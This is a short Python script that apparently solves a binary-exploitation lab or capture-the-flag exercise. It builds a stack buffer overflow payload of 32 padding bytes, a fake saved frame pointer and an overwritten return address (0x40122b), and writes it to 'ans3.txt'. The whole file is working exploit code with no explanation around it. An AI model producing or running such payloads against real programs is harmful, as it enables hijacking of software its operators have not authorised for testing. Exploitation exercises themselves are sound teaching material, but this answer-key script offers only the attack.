import sys

buffer_padding = b'A' * 32

fake_rbp = (0x403550).to_bytes(8, 'little')

target_address = (0x40122b).to_bytes(8, 'little')

payload = buffer_padding + fake_rbp + target_address

with open("ans3.txt", "wb") as f:
    f.write(payload)

